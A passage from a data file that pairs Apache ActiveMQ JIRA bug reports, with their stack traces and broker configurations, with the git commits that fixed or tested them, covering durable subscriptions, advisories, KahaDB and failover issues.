java.lang.Thread.run at line #722{code}",640424727d0db68047dd16701e3e03bc4ef2b680,"https://issues.apache.org/jira/browse/AMQ-3998 https://issues.apache.org/jira/browse/AMQ-3999 - retroactive durables not supported by older stores, kaha and amq

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1380847 13f79535-47bb-0310-9956-ffa450edef68"
12605203,AMQ-3998,"A durable sub that does not ack messages, so uses a transaction of client ack and connects then disconnects results in duplicate tally of the pending message count for the active sub (keepdurablesubsactive must be at default true). This issue emerged post fixes for https://issues.apache.org/jira/browse/AMQ-3871",640424727d0db68047dd16701e3e03bc4ef2b680,"https://issues.apache.org/jira/browse/AMQ-3998 https://issues.apache.org/jira/browse/AMQ-3999 - retroactive durables not supported by older stores, kaha and amq

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1380847 13f79535-47bb-0310-9956-ffa450edef68"
12604231,AMQ-3985,"A slow or blocked connection with the default temp advisory consumer can cause operations that create advisories to block b/c the dispatch is sync to that advisory consumer. If the block occurs after the prefetch is filled the broker stores pending messages and the problem is avoided, but if the block occurs before the prefetch is reached, the dispatch is attempted in the calling thread, which blocks the originating operation. not good.
The solution is to always request async dispatch for the temp advisory consumer in a client connection.",ba9037ca65abd4d7657971555c65d4fada710c7c,"https://issues.apache.org/jira/browse/AMQ-3985 - ActiveMQConnection temp advisory consumer should use asyncDispatch - can cause deadlock with slow consumers. Fix with test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1375595 13f79535-47bb-0310-9956-ffa450edef68"
12601445,AMQ-3961,"A durable subscriber is connected to ActiveMQ using the ConnectionConsumer protocol, transacted sessions, and at most 1 message per session. While the subscriber is disconnected, the publisher publishes e.g. 10 messages. When the subscriber re-connects, it only receives 2 messages of those. If it repeatedly disconnects and re-connects, it receives 2 messages each time until all messages are received.

Further investigation reveals that the problem lies in class org.apache.activemq.broker.region.PrefetchSubscription which does not re-check for further pending messages to be dispatched when committed message are removed from the list of dispatched but not yet acknowledged messages.",3c39db8cce4a696e58417e7b5fc9892fd2667e8f,"fix and test for: https://issues.apache.org/jira/browse/AMQ-3961

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1374229 13f79535-47bb-0310-9956-ffa450edef68"
12601338,AMQ-3958,"The reference to 5.6.0 schema should also be included in spring.schemas file:

{code}
http\://activemq.apache.org/schema/core/activemq-core-5.6.0.xsd=activemq.xsd
{code}

",378d7a606b66a2e5f5fcf06f8f19bf8866e7007e,"https://issues.apache.org/jira/browse/AMQ-3958 - fix up for current and next few versions, highlight in the release guide

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1368861 13f79535-47bb-0310-9956-ffa450edef68"
12601039,AMQ-3955,"In the StompServlet, when a websocket request comes in, we are starting up the broker's websocket connection when we call listener.onAccept(socket). 
Under the covers, it begins a task in a new thread to create the connection, instantiate the transport listener, and set the listener on the transport. However, this is done asynchronously, and when the StompServlet calls listener.onAccept(socket), it immediately returns to the underlying jetty websockets implementation, returning the StompSocket (which as the websocket onTextMessage listener). It seems it's possible the jetty code could call back the onTextMessage listener's onMessage(...) method and expect the StompSocket to process the Stomp message before the steps taken to complete creating the connection from the async listener.onAccept(..) call.",6f92d5f8b937c41206d6bbdc8205743aa8eb506a,"https://issues.apache.org/jira/browse/AMQ-3955 - web socket transport race condition

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1367915 13f79535-47bb-0310-9956-ffa450edef68"
12599029,AMQ-3932,"I have a connection set up using failover and queuePrefetch=0.  I create a consumer, stop the broker, and call receiveNoWait.

I would expect this to return/throw immediately; instead it hangs.  Without failover or with a non-zero prefetch it works as expected.",0227c081120108b912bcb8898b83c2c4b5bb0119,"fix and tests for: https://issues.apache.org/jira/browse/AMQ-3932

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1364009 13f79535-47bb-0310-9956-ffa450edef68"
12598654,AMQ-3925,"Two problems relating to advisory messages

# Advisory messages and topics are not being created for {{ActiveMQ.Advisory.FULL}} or {{ActiveMQ.Advisory.FastProducer.\{Queue,Topic}}}\\
\\
# The {{PolicyEntry}} property for {{ActiveMQ.Advisory.FastProducer.\{Queue,Topic}}} is misspelled as advis{color:red}d{color}oryForFastProducers.\\
\\
Note that it is spelled with an extra 'd' (advisDory....) Moreover, the configuration XML expects the 'd' in this name. I tried spelling it correctly and activemq 5.6.0 failed when I used the corrected name of advisoryForFastProducers.\\
\\


I have customized the {{{color:blue}activemq.xml{color}}} configuration file so that advisory support is enabled, and I added a policy entry to turn on {{ActiveMQ.Advisory.FULL}} and {{ActiveMQ.Advisory.FastProducer.Queue}}. Moreover, {{systemUsage}} has been configured to send an exception to the producer if memory, storage or temp usage exceeds certain amounts.

I have attached my {{{color:blue}activemq.xml{color}}} file.


I have expanded the {{{color:blue}simple_producer.cpp{color}}} example file to use the AMQ client interface that our product has. Essentially it creates a connection and all the scaffolding to send messages to the broker. Then it sits in a loop and sends messages. It has some parameters to allow control such as exiting on the first exception (such as when the broker sends its flow control exception when the producer causes the broker to reach it's configured limits, or limiting the number of messages to send).

This is attached as the {{{color:blue}simple_producer.cpp{color}}} file.


I have expanded the {{{color:blue}simple_consumer.cpp{color}}} example file to display message/queue names and work with advisory messages too. It has options to allow the user to indicate which queues/topics to connect too, where the default is the queues that our product uses.

This is attached as the {{{color:blue}simple_consumer.cpp{color}}} file.


The test/problem are as follows:

# Start the broker in console mode, validating that no errors occurred, it's current system usage limit configuration is small enough that it doesn't take long to reach the limit.\\
\\
# Start the *producer* so that it will send messages to it's default queue ({{c.c.p.v.ms.events}}) and terminate as soon as the broker sends it a flow control exception.\\
\\
{{env EX_LIMIT=1 ./simple_producer.exe}}\\
\\
This will run for 2-5 minutes. It usually gets an exception around 25,223 messages.\\
\\
# When the producer terminates, use the WebConsole to view the broker, navigating to the Topics screen and we see the Advisory topics that are created.\\
\\
There is only: {{ActiveMQ.Advisory.Connection}}, {{ActiveMQ.Advisory.Producer.Queue.c.c.p.v.ms.events}} and {{ActiveMQ.Advisory.Queue}}.\\
\\
Since the producer was terminated due to flow control caused by the disk/memory usage limit being reached, we should also see the advisory queues for {{ActiveMQ.Advisory.FULL}} and {{ActiveMQ.Advisory.FastProducer.Queue}}.\\
\\
# Start the *consumer* so that it will monitor all advisory topics.\\
\\
{{env DEST=""ActiveMQ.Advisory.>"" TOPIC=1 simple_consumer.exe}}\\
\\
# Refresh the WebConsole screen. Each of the advisory topics will now show a consumer.\\
\\
# Use the producer to send in one message. The broker is at its usage limits so that send will be flow controlled, causing an exception to be sent to the producer.\\
\\
{{env MSG_LIMIT=1 simple_producer.exe}}\\
\\
The consumer will now accept and display the advisory messages it has received. There will be two for {{ActiveMQ.Advisory.Connection}} for the producers connection start and stop, and two for the {{ActiveMQ.Advisory.Producer.Queue.c.c.p.v.ms.events}} as the producerCount goes to 1 and then to zero as the producer connects and disconnects to the topic.\\
\\
There is no FastConsumer or FULL advisory generated even though their conditions have been triggered.\\
\\


Detailed test output for the summary listed above is attached.
",a5bb9bd1d792b1676884f31e5254d9e1c4fbb27c,"https://issues.apache.org/jira/browse/AMQ-3903  - expand test to validate Full advisory: https://issues.apache.org/jira/browse/AMQ-3925

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1361138 13f79535-47bb-0310-9956-ffa450edef68"
12598292,AMQ-3921,"In a slightly modified version of JUnit test case org.apache.activemq.usecases.DurableSubscriptionActivationTest from activemq-core there will be a failure because reactivated subscription with the same SubscriptionName and ClientID after broker restart was not correctly recognized and as a result, a duplicated durable subscriptions was added to consumers list.",425fa4736011cf093ed31b64fe60ba85876deb34,"additional fix for fo:r https://issues.apache.org/jira/browse/AMQ-3921 make sure on selector change that we remove the subscription from the list so that the updated one gets put back in.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1359952 13f79535-47bb-0310-9956-ffa450edef68"
12597236,AMQ-3912,"persistent=""false"" means use only the memory persistence adapter, ignore the persistence attribute of a message or durable sub.
If a <persistenceAdapter /> element is specified in xml config, durable subs do get persistence of messages that will survive a restart. This is not the intent of persistent=""false""",ae816dcb3fdaf22b80ed4122a552b7c0275458f6,"https://issues.apache.org/jira/browse/AMQ-3912 - Durable subs store messages in error with broker attribute persistent=""false"" - fix with test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1356724 13f79535-47bb-0310-9956-ffa450edef68"
12596260,AMQ-3903,"When sending a lot of Messages to Queue via Webconsole and advisdoryForFastProducers=""true"" (so the advisory triggers)
a exception occurs:

jvm 1    |  WARN | Failed to fire fast producer advisory, reason: java.lang.NullPointerException

2012-07-12 11:40:48,623 | DEBUG | fast producer detail | org.apache.activemq.advisory.AdvisoryBroker | VMTransport: vm://localhost#1
java.lang.NullPointerException
	at org.apache.activemq.advisory.AdvisorySupport.getFastProducerAdvisoryTopic(AdvisorySupport.java:195)
	at org.apache.activemq.advisory.AdvisoryBroker.fastProducer(AdvisoryBroker.java:352)
	at org.apache.activemq.broker.BrokerFilter.fastProducer(BrokerFilter.java:275)
	at org.apache.activemq.broker.BrokerFilter.fastProducer(BrokerFilter.java:275)
	at org.apache.activemq.broker.MutableBrokerFilter.fastProducer(MutableBrokerFilter.java:286)
	at org.apache.activemq.broker.region.BaseDestination.fastProducer(BaseDestination.java:512)
	at org.apache.activemq.broker.region.Queue.send(Queue.java:605)
	at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:407)
	at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:503)
	at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:305)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.scheduler.SchedulerBroker.send(SchedulerBroker.java:189)
	at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:129)
	at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96)
	at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:306)
	at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:135)
	at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:453)
	at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:681)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:292)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:150)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:231)
	at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
	at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)",a5bb9bd1d792b1676884f31e5254d9e1c4fbb27c,"https://issues.apache.org/jira/browse/AMQ-3903  - expand test to validate Full advisory: https://issues.apache.org/jira/browse/AMQ-3925

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1361138 13f79535-47bb-0310-9956-ffa450edef68"
12593956,AMQ-3885,"The ActiveMQ broker scales to tens of thousands of queues easily when using -Dorg.apache.activemq.UseDedicatedTaskRunner=false (false by default).

A problem actually arises in the java client side, when a client is listening to X queues using 1 connection and Y sessions per queue, using a JMS message listener, X * Y threads will be created, when X * Y is not bounded,

This is because each ActiveMQConnection object holds a TaskRunnerFactory which in turn has a ThreadPoolExecutor, the max pool size of the executor is defined to be Integer.MAX_VALUE, with the combination of a SynchronousQueue it creates as many threads as it pleases.

the behavior of the executor is dependent on min pool size, core pool size, queue impl and rejection policy 

a few options to handle this :
1. the default rejection policy throws an exception which is not handled,
ThreadPoolExecutor.CallerRunsPolicy sounds better then the default

2. Change the queue impl to LinkedBlockingQueue and change the core pool size to a bounded value

3. Provide the means to supply an external executor to be shared in the app",9cda4262e96a31a2bee1f3271030da0341f452c2,"https://issues.apache.org/jira/browse/AMQ-3885 - add max thread pool size to properties

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1365945 13f79535-47bb-0310-9956-ffa450edef68"
12560673,AMQ-3881,useful script contributed by a user that pulls together os diagnostic utility output into a single archive. Useful for remote troubleshooting.,87b2920927573addf8278bdeb41740be3ffbab32,"https://issues.apache.org/jira/browse/AMQ-3881 - handy diag script to gather info about the host machine and broker java process and combine into a compressed log, some users have found it valuable in production

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1355055 13f79535-47bb-0310-9956-ffa450edef68"
12556621,AMQ-3853,"Running activemq-web-console in Karaf generates these errors:

Caused by: java.lang.ClassNotFoundException: javax.servlet.ServletContextListener not found by org.apache.activemq.activemq-web-console [118]

Caused by: java.lang.ClassNotFoundException: javax.servlet.Filter not found by org.apache.activemq.activemq-web-console [118]

Caused by: java.lang.ClassNotFoundException: javax.servlet.http.HttpServlet not found by org.apache.activemq.activemq-web-console [118]

It looks like activemq-web-console imports the following servlet packages:

        javax.servlet.jsp;version=""[2.1,3)"",
	javax.servlet.jsp.el;version=""[2.1,3)"",
	javax.servlet.jsp.tagext;version=""[2.1,3)"",

So it seems to be missing imports for:

javax.servlet
javax.servlet.http
",1b28cf1792e6eb0b2f49d46ef2d02652977ae7be,"https://issues.apache.org/jira/browse/AMQ-3853 - activemq-web-console osgi import

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1341810 13f79535-47bb-0310-9956-ffa450edef68"
12555856,AMQ-3841,"To replicate, use these settings in the activemq.xml
{code}
		<persistenceAdapter>
			<mKahaDB directory=""${activemq.data}/kahadb"">
				<filteredPersistenceAdapters>
					<filteredKahaDB perDestination=""true"" >
						<persistenceAdapter>
							<kahaDB journalMaxFileLength=""32mb"" />
						</persistenceAdapter>
					</filteredKahaDB>
				</filteredPersistenceAdapters>
			</mKahaDB>
		</persistenceAdapter>
{code}

# Start the broker
# Create a queue
#* This will create the queue in the /kahadb folder
# Delete the queue
#* The queue is not deleted from the /kahadb folder
# Stop the broker
# Start the broker

This will cause cause the stack trace that is attached.

To fix this, delete the queue in the /kahadb folder and start the broker.  This allows the broker to start as normal.",3082a20520ac73ff954e420b0981d2c54b1bfd24,"Unit test that reproduces AMQ-3841

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1339660 13f79535-47bb-0310-9956-ffa450edef68"
12552652,AMQ-3819,"Switching an existing workload from a transport:

{quote}
<transportConnector name=""verified_stompssl""  uri=""stomp+ssl://0.0.0.0:6165?needClientAuth=true""/>
{quote}

to

{quote}
<transportConnector name=""verified_stompssl""  uri=""stomp+nio+ssl://0.0.0.0:6165?needClientAuth=true""/>
{quote}

showed the CPU profile to go from 1-5% to 300% constantly on a 8 core server

I was able to recreate this using a ruby client @ http://devco.net/rip/amq_560_stomp_nio_ssl_tester.rb

The important combinations are:

 * I am connecting to a stomp+nio+ssl port
 * I am creating the subscriptions to the 10 queus and topics

If I change either of these variables - like just commenting out the loop that does those subscriptions - then the CPU load is acceptable.

I analysed the running VM with VisualVM and found that transport.nio.NIOSSLTransport.serviceRead() is the busy thread.  


My activemq.xml is:

{noformat}
<beans
  xmlns=""http://www.springframework.org/schema/beans""
  xmlns:amq=""http://activemq.apache.org/schema/core""
  xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
  xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
  http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd
  http://activemq.apache.org/camel/schema/spring http://activemq.apache.org/camel/schema/spring/camel-spring.xsd"">
    <broker xmlns=""http://activemq.apache.org/schema/core"" brokerName=""amq1"" useJmx=""true"" persistent=""true"" schedulePeriodForDestinationPurge=""60000"">
        <destinationPolicy>
          <policyMap>
            <policyEntries>
              <policyEntry topic="">"" producerFlowControl=""false""/>
              <policyEntry queue=""*.reply.>"" gcInactiveDestinations=""true"" inactiveTimoutBeforeGC=""120000"" />
            </policyEntries>
          </policyMap>
        </destinationPolicy>

        <managementContext>
          <managementContext connectorPort=""1099"" jmxDomainName=""org.apache.activemq""/>
        </managementContext>

        <plugins>
          <statisticsBrokerPlugin/>
          <simpleAuthenticationPlugin>
            <users>
              <authenticationUser username=""test"" password=""test"" groups=""admins,everyone""/>
            </users>
          </simpleAuthenticationPlugin>
          <authorizationPlugin>
            <map>
              <authorizationMap>
                <authorizationEntries>
                  <authorizationEntry queue="">"" write=""admins"" read=""admins"" admin=""admins"" />
                  <authorizationEntry topic="">"" write=""admins"" read=""admins"" admin=""admins"" />
                </authorizationEntries>
              </authorizationMap>
            </map>
          </authorizationPlugin>
        </plugins>

        <sslContext>
           <sslContext
                keyStore=""keystore.jks"" keyStorePassword=""ohshahCu""
                trustStore=""truststore.jks"" trustStorePassword=""ohshahCu""
           />
        </sslContext>

        <systemUsage>
          <systemUsage>
            <memoryUsage>
              <memoryUsage limit=""200 mb"" />
            </memoryUsage>
            <storeUsage>
              <storeUsage limit=""1 gb"" />
            </storeUsage>
            <tempUsage>
              <tempUsage limit=""1 gb"" />
            </tempUsage>
          </systemUsage>
        </systemUsage>

        <transportConnectors>
          <transportConnector name=""openwire""  uri=""tcp://0.0.0.0:6166""/>
          <transportConnector name=""stomp+nio"" uri=""stomp+nio://0.0.0.0:6163""/>
          <transportConnector name=""stompssl""  uri=""stomp+ssl://0.0.0.0:6164""/>
          <transportConnector name=""verified_stompssl""  uri=""stomp+nio+ssl://0.0.0.0:6165?needClientAuth=true""/>
        </transportConnectors>
    </broker>

    <import resource=""jetty.xml""/>
</beans>
{noformat}",ec87b17be013b1ddbf45c1ca91a24878f074dd2e,"test for: https://issues.apache.org/jira/browse/AMQ-3819

Creates a load test based on the user supplied ruby script.  There are four variations, one for each of the transport types.  Tests show that only the Stomp+NIO+SSL fails under this scenario. 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1331481 13f79535-47bb-0310-9956-ffa450edef68"
12552203,AMQ-3817,"Enabling the TraceBrokerPathPlugin with a custom property name = 'JMSXTrace' sends outdated information to the consumer. When inspecting the property at the consumer code, it has not been updated with the complete broker path. Only the first broker, where the message was produced into, appears. No matter how many brokers are in the route (tested with 4).

Having dug into the code, it looks like marshalledProperties in Message were already set but not dirtied when setProperty was called again from the TraceBrokerPathPlugin. Also, Message.beforeMarshall() assumes that since marshalledProperties is already set, it doesn't need updating. Therefore, the message is dispatched to the consumer with an old version of the properties.

I think Message.setProperty() should check whether marshalledProperties already has a value. If it does, it should re-marshall (i.e. dirty the cache).",53fff528a71193e3af8b7c2dfb5b63dd509fac83,"Apply patch for: https://issues.apache.org/jira/browse/AMQ-3817

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1340219 13f79535-47bb-0310-9956-ffa450edef68"
12549282,AMQ-3797,"A static block in org.apache.activemq.util.IntrospectionSupport registers org.apache.activemq.util.StringArrayEditor with java.beans.PropertyEditorManager. In a web application environment, this will cause classloader leaks, since java.beans.PropertyEditorManager keeps a strong reference to the editor class.

ActiveMQ should at least provide a graceful means of deregistering org.apache.activemq.util.StringArrayEditor (by calling java.beans.PropertyEditorManager.registerEditor() again with editor class null).",bed42a27c606cf9133eb874bb934ce7dfa5004d6,"AMQ-3797: Added unit test for StringArrayEditor

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1380147 13f79535-47bb-0310-9956-ffa450edef68"
12547390,AMQ-3782,"Failover transport occasionally throws NullPointerException

INFO   | jvm 1    | 2012/03/19 09:25:05 | Exception in thread ""ActiveMQ Failover Worker: 2009192672"" java.lang.NullPointerException
INFO   | jvm 1    | 2012/03/19 09:25:05 |       at org.apache.activemq.transport.failover.FailoverTransport$2.iterate(FailoverTransport.java:125)
INFO   | jvm 1    | 2012/03/19 09:25:05 |       at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:98)
INFO   | jvm 1    | 2012/03/19 09:25:05 |       at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

It seems like DedicatedTaskRunner starts Thread before FailoverTransport finish initializing   reconnectTask field. 

Same code is present in 5.5.1 so it's possible that same bug is out there
",d92d3a8a06b6a20769d39c5b1cf19a7c8bf91921,"fix for: https://issues.apache.org/jira/browse/AMQ-3782

avoid any potential NPE and try again.

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1304057 13f79535-47bb-0310-9956-ffa450edef68"
12547072,AMQ-3775,"KahaDB journal files retained after delay in ""unsubscribing"" durable subscriber from topic.This issue only appears to occur when Durable Subscriber is registered with a ""selector"" that does not match all messages on topic.

Scenario:

Msg Producer sending messages to topic.

Durable subscriber registered with a selector on topic
After 20 seconds; stop calling consumer.receive() .
Another Durable subscriber registers on the topic
After 20 seconds; stop calling consumer.receive() .
Continue this pattern till 10 durable subscribers are registered with topic

Then unsubscribe all 10 Durable subscribers.

",13e5777efb8f13c916a14fd415425a350713c244,"additional test for: https://issues.apache.org/jira/browse/AMQ-3775

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1302641 13f79535-47bb-0310-9956-ffa450edef68"
12547072,AMQ-3775,"KahaDB journal files retained after delay in ""unsubscribing"" durable subscriber from topic.This issue only appears to occur when Durable Subscriber is registered with a ""selector"" that does not match all messages on topic.

Scenario:

Msg Producer sending messages to topic.

Durable subscriber registered with a selector on topic
After 20 seconds; stop calling consumer.receive() .
Another Durable subscriber registers on the topic
After 20 seconds; stop calling consumer.receive() .
Continue this pattern till 10 durable subscribers are registered with topic

Then unsubscribe all 10 Durable subscribers.

",3cea40d889fa87aa053fa2472f90c3d30b586352,"https://issues.apache.org/jira/browse/AMQ-3775

Ensure that the orderIndex is reset to a good state. 

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1303128 13f79535-47bb-0310-9956-ffa450edef68"
12547072,AMQ-3775,"KahaDB journal files retained after delay in ""unsubscribing"" durable subscriber from topic.This issue only appears to occur when Durable Subscriber is registered with a ""selector"" that does not match all messages on topic.

Scenario:

Msg Producer sending messages to topic.

Durable subscriber registered with a selector on topic
After 20 seconds; stop calling consumer.receive() .
Another Durable subscriber registers on the topic
After 20 seconds; stop calling consumer.receive() .
Continue this pattern till 10 durable subscribers are registered with topic

Then unsubscribe all 10 Durable subscribers.

",ccaf0839daf14ccf13b225240fc85345d68b41ec,"additional test for: https://issues.apache.org/jira/browse/AMQ-3775

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1311511 13f79535-47bb-0310-9956-ffa450edef68"
12547072,AMQ-3775,"KahaDB journal files retained after delay in ""unsubscribing"" durable subscriber from topic.This issue only appears to occur when Durable Subscriber is registered with a ""selector"" that does not match all messages on topic.

Scenario:

Msg Producer sending messages to topic.

Durable subscriber registered with a selector on topic
After 20 seconds; stop calling consumer.receive() .
Another Durable subscriber registers on the topic
After 20 seconds; stop calling consumer.receive() .
Continue this pattern till 10 durable subscribers are registered with topic

Then unsubscribe all 10 Durable subscribers.

",740f5b36dabe549cab66cba413106afd76d83343,"Additional test for: https://issues.apache.org/jira/browse/AMQ-3775


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1329225 13f79535-47bb-0310-9956-ffa450edef68"
12546479,AMQ-3768,"When running the DurableSubProcessWithRestartTest for long intervals you can sometimes see.

{noformat}

ERROR rableSubProcessWithRestartTest - Server.run failed
java.lang.RuntimeException: Server.run failed
	at org.apache.activemq.usecases.DurableSubProcessWithRestartTest.exit(DurableSubProcessWithRestartTest.java:738)
	at org.apache.activemq.usecases.DurableSubProcessWithRestartTest$Server.run(DurableSubProcessWithRestartTest.java:185)
Caused by: javax.jms.JMSException: STORE COMMIT FAILED: Transaction rolled back.
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1297)
	at org.apache.activemq.TransactionContext.syncSendPacketWithInterruptionHandling(TransactionContext.java:748)
	at org.apache.activemq.TransactionContext.commit(TransactionContext.java:322)
	at org.apache.activemq.ActiveMQSession.commit(ActiveMQSession.java:560)
	at org.apache.activemq.usecases.DurableSubProcessWithRestartTest$Server.send(DurableSubProcessWithRestartTest.java:232)
	at org.apache.activemq.usecases.DurableSubProcessWithRestartTest$Server.run(DurableSubProcessWithRestartTest.java:179)
Caused by: javax.transaction.xa.XAException: STORE COMMIT FAILED: Transaction rolled back.
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:77)
	at org.apache.activemq.broker.TransactionBroker.commitTransaction(TransactionBroker.java:252)
	at org.apache.activemq.broker.MutableBrokerFilter.commitTransaction(MutableBrokerFilter.java:103)
	at org.apache.activemq.broker.TransportConnection.processCommitTransactionOnePhase(TransportConnection.java:414)
	at org.apache.activemq.command.TransactionInfo.visit(TransactionInfo.java:100)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:291)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:149)
	at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:116)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:218)
	at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122)
	at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.lang.ClassCastException: org.apache.kahadb.index.BTreeNode cannot be cast to org.apache.kahadb.index.ListNode
	at org.apache.kahadb.index.ListIndex.loadNode(ListIndex.java:289)
	at org.apache.kahadb.index.ListIndex.getHead(ListIndex.java:98)
	at org.apache.kahadb.index.ListIndex.iterator(ListIndex.java:266)
	at org.apache.kahadb.index.ListIndex.get(ListIndex.java:127)
	at org.apache.activemq.store.kahadb.MessageDatabase.addAckLocationForNewMessage(MessageDatabase.java:1826)
	at org.apache.activemq.store.kahadb.MessageDatabase.upadateIndex(MessageDatabase.java:1130)
	at org.apache.activemq.store.kahadb.MessageDatabase$AddOpperation.execute(MessageDatabase.java:2029)
	at org.apache.activemq.store.kahadb.MessageDatabase$18.execute(MessageDatabase.java:1055)
	at org.apache.kahadb.page.Transaction.execute(Transaction.java:765)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:1052)
	at org.apache.activemq.store.kahadb.MessageDatabase$13.visit(MessageDatabase.java:921)
	at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)
	at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:903)
	at org.apache.activemq.store.kahadb.MessageDatabase.store(MessageDatabase.java:815)
	at org.apache.activemq.store.kahadb.KahaDBTransactionStore.commit(KahaDBTransactionStore.java:267)
	at org.apache.activemq.transaction.LocalTransaction.commit(LocalTransaction.java:72)
	... 14 more

{noformat}",eab87585294f2fead68c9606dc9ad144b52a2f07,"fixes for: https://issues.apache.org/jira/browse/AMQ-3768

Adds some additional eager cache invalidation to ensure we don't use stale nodes

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1301145 13f79535-47bb-0310-9956-ffa450edef68"
12544324,AMQ-3743,"The maven-war-plugin will install snapshot version dependencies using their timestamp qualified name but the maven-bundle-plugin used to generate the Bundle-ClassPath strips off the timestamp qualifier.
The fix is to make use of the [archive file name mapping|http://maven.apache.org/plugins/maven-war-plugin/examples/file-name-mapping.html] to strip off the qualifier in for the embedded dependencies.
This is only a problem during development as we never release with SNAPSHOT dependencies.
",14c1766843a794cc3727b012636bdcb17ee84a4a,"https://issues.apache.org/jira/browse/AMQ-3743 - activemq-web-console WAR with SNAPSHOT dependencies breaks osgi Bundle-ClassPath in manifest. Make use of the war plugin outputFileNameMapping to ensure the timestamp is dropped to match the bundle-classpath

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1294359 13f79535-47bb-0310-9956-ffa450edef68"
12542745,AMQ-3719,"I have only encountered this failure when the broker is experiencing heavy load and a new connection attempt is made.

* The FailoverTransport tracks commands that have been issued so that it can restore the state upon a failure/reconnect event.
* If an IOException occurs when sending a tracked command, the oneway() method returns, assuming that the IOException is indicative of a transport failure and will result in a failure/reconnect event.
* Some IOExceptions (like WireFormatNegotiation timesouts) are not always indicative of transport failure however.  In this case since no subsequent failure/reconnect event occurs, the command will never be resent.  If this is a synchronous command (like that generated by starting a connection) the calling thread will hang.

Incidentally, my reading of the code is that only non-tracked commands can generate the IOException that triggers the handleTransportFailure command.  Is that what we really want?  

My belief is that the IOExceptions should always result in the triggering of the handleTransportFailure, regardless of origin.

I will attach a unit test and fix shortly.  The test will often fail (i.e. hang) without the fix, but not always since I use a wireFormat.maxInactivityDurationInitalDelay=1 option to trigger the behavior.  If the system runs fast enough, it sometimes will not get the timeout.  I wasn't sure exactly how such a test should be written...The test will fail if connection does not succeed within 60s",a7e7bce0aefd0624d9c6e94337477a5861804bac,"fix and test for: https://issues.apache.org/jira/browse/AMQ-3719

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1300726 13f79535-47bb-0310-9956-ffa450edef68"
12542419,AMQ-3715,"According to the documentation [1], the activemq-all.jar should contain all required libraries.  However when running a sample project the following error occurs:

java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
